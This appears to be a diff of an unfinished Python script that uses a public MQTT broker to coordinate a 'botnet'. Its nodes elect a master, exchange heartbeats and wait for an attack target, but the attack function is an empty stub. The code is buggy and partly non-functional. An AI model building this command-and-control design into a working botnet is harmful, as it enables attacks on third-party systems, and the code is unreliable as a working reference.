@@ -2,128 +2,160 @@ import paho.mqtt.client as mqtt
 import time
 broker = "iot.eclipse.org"
 port = 1883
-received
-nodeId
-lastId
-received = -1
-lastId = -555
-nodeId = -1
-restas = 0
-attackDirection = "0.0.0.0"
-heartbeat = "Node "+str(nodeId)+" alive"
+global received,nodeId,lastId,target
+target=0
+received=-1
+lastId=-555
+nodeId=-1
 
-#Attacking
-#def attack(direction):
-    #while(True):
-    #    attack(direction)
-        #Get direction
-        #Check every n loops for stop, waits 4 seconds
-
-# Establishing new last id and setting it to node
-def setNodeId(newLastId):
-    global nodeId
-    nodeId = newLastId
-    print("Node id:", newLastId)
-    ret = client.publish("botnet/lastId", nodeId)
-
-def setLastId(newLastId):
+def heartbeat():
+    global target
     global lastId
-    lastId = int(msg.payload)
-    print("New local last id:", lastId)
+    return str(target)+" "+str(lastId)
 
-def on_publish(client, userdata, result):
-    print("data published ",userdata," \n")
+def slave():
+    global client
+    global nodeId
+    def on_connect(client, userdata, flags, rc):
+        print("Connected with result code "+str(rc))
+        client.subscribe("botnet/heartbeat")
+
+    client.on_connect = on_connect
+    client.on_message = on_message
+    client.on_publish = on_publish
+    client.connect(broker,port)
+    
+    startTime=time.time()
+    time.sleep(1)
+    while(nodeId==0):
+        client.loop(.1)
+        if(int((time.time()-startTime)%60%2)==0):
+            startTime=time.time()
+            if (not isReceived()):
+                master()
+def master():
+    global client
+    global nodeId
+    global lastId
+    def on_connect(client, userdata, flags, rc):
+        print("Connected with result code "+str(rc))
+        client.subscribe("botnet/target")
+        client.subscribe("botnet/lastId")
+    def on_message(client, userdata, msg):
+        global received
+        global lastId
+        print(msg.topic+" "+str(msg.payload))
+        print(" ")
+        received=1
+        if(msg.topic=="botnet/lastId" and lastId!=int(msg.payload)):
+            lastId=int(msg.payload)
+            print("New local last id:",lastId)
+        if(msg.topic=="botnet/target"):
+            target=str(msg.payload)
+            print("New local target:",target)
+
+
+    client.on_connect = on_connect
+    client.on_message = on_message
+    client.on_publish = on_publish
+    client.connect(broker,port)
+    
+##    sub a target
+##    sub a id
+##    publish cada 2 -> ip id
+
+    if(nodeId==-1):
+        lastId=0
+        nodeId=0
+    startTime=time.time()
+    while(nodeId==0):
+        client.loop(.1)
+        if(int((time.time()-startTime)%60%1)==0):
+            startTime=time.time()
+            time.sleep(1)
+            ret= client.publish("botnet/heartbeat",heartbeat())
+            
+            print("Last id:",lastId)
+            print(ret)
+            
+def isSlave():
+    return nodeId==1
+def isReceived():
+    return received==1
+def attack():
+    global target
+    startTime=time.time()
+    while(True):
+        ##get
+        client.loop(.1)
+        if(int((time.time()-startTime)%60)==0):
+            print("Checking")
+            if(target=="0"):
+                break
+                return
+            startTime=time.time()
+        #delay 
+def common():
+    global client
+    def setNodeId(newLastId):
+        global nodeId
+        nodeId=newLastId
+        print("Node id:",newLastId)
+        ret= client.publish("botnet/lastId",nodeId)
+    def on_connect(client, userdata, flags, rc):
+        print("Connected with result code "+str(rc))
+        client.subscribe("botnet/heartbeat")
+    def on_message(client, userdata, msg):
+        global received
+        global lastId
+        global target
+        received=1
+        inp=str(msg.payload)[2:-1].split(" ")
+        #print("Message",inp)
+        topic=msg.topic
+        print(topic+" "+inp)
+        print(" ")
+        
+        print(topic,"topico")
+        print("laz",lastId,"int(inp[1])",int(inp[1]))
+        if(topic=="botnet/heartbeat" and lastId!=int(inp[1])):
+            print("lasaidi",inp[1])
+            lastId=int(inp[1])
+            print("New local last id:",lastId)
+        if(msg.topic=="botnet/heartbeat" and inp[0]!="0"): ##Regex for catching ip
+           target= inp[0]
+           attack()
+    client.on_connect = on_connect
+    client.on_message = on_message
+    client.on_publish = on_publish
+    client.connect(broker,port)
+    
+    startTime=time.time()
+    time.sleep(1)
+    while(True):
+        client.loop(.1)
+        #print("Mi id",nodeId)
+        if(int((time.time()-startTime)%60%14)==0):
+            time.sleep(1)## 15 seconds elapsed
+            #print("15 seconds elapsed")
+            
+            if(nodeId==-1 and isReceived()):   
+                setNodeId(lastId+1)
+            if(not isReceived()):
+                print("isre",isReceived())
+                print("No alive nodes, i'll be the master one")
+                master()
+                #client.loop_stop()
+                break
+            else:
+                received=0
+    
+    if(isSlave() and not isReceived()):
+        master()
+def on_publish(client,userdata,result): 
+    print("data published \n")
     pass
 
-# The callback for when the client receives a CONNACK response from the server.
-#on connect y onmessage distintos para raiz y esclavos --> entrada mensaje de dirección a atacar //// controlar last id
-def on_connect(client, userdata, flags, rc):
-    print("Connected with result code "+str(rc))
-    # Subscribing in on_connect() means that if we lose the connection and
-    # reconnect then subscriptions will be renewed.
-    # client.subscribe("$SYS/#")
-    client.subscribe("botnet/target") #start / stop
-    client.subscribe("botnet/heartbeatId") #Imprime lastId
-    client.subscribe("botnet/lastId")
-#    client.subscribe("botnet/attackstatus") 
-
-# The callback for when a PUBLISH message is received from the server.
-def on_message(client, userdata, msg):
-    global received
-    global lastId
-    print(msg.topic+" "+str(msg.payload))
-    print(" ")
-    received = 1
-    if(msg.topic == "botnet/lastId" and lastId != int(msg.payload)):
-        setLastId(int(msg.payload))
-    if(msg.topic=="botnet/target" and msg.payload!="0.0.0.0")
-    startTime = time.time()
-    while(True):
-        if(int((time.time()-startTime) % 60) == 0):
-            
-
 client = mqtt.Client()
-client.on_connect = on_connect
-client.on_message = on_message
-client.on_publish = on_publish
-client.connect(broker, port)
+common()
 
-# Blocking call that processes network traffic, dispatches callbacks and
-# handles reconnecting.
-# Other loop*() functions are available that give a threaded interface and a
-# manual interface.
-
-# Runs until it receives a message
-
-startTime = time.time()
-while(True):
-    client.loop(.1)
-    #print("Mi id",nodeId)
-    if(int((time.time()-startTime) % 60 % 20) == 0):
-        time.sleep(1)  # 15 seconds elapsed
-        #print("15 seconds elapsed")
-
-        # if(nodeId==-1 and received==1):
-        #     setNodeId(lastId+1)
-        # if(received==0):
-        #     print("No alive nodes, i'll be the master one")
-        #     #client.loop_stop()
-        #     break
-        # else:
-        #     received=0
-
-        if(received == 1):
-            print("Id", nodeId, "lastId", lastId)
-            if(nodeId <= -1):
-                setNodeId(lastId+1)
-        elif(nodeId <= 1 and received == 0):  # Fixiable
-            print("No alive nodes, i'll be the master one")
-            # client.loop_stop()
-            break
-        else:
-            nodeId -= 1
-            lastId -= 1
-            restas += 1
-            print("NodeId--", nodeId, "restas", restas)
-        received = 0
-        # Control de errores?
-        if(nodeId > lastId):
-            nodeId -= 1  # ?
-
-# Node take leadership of the botnet
-if(nodeId <= -1):
-    lastId = 0
-else:
-    restas += 1
-    lastId -= 1
-nodeId = 0
-startTime = time.time()
-
-while(nodeId == 0):
-    client.loop(.1)
-    if(int((time.time()-startTime) % 60 % 2) == 0):
-        time.sleep(1)
-        #ret= client.publish("botnet/heartbeatId",heartbeat)
-        ret = client.publish("botnet/lastId", lastId)
-        print("Last id:", lastId)
-        print(ret)
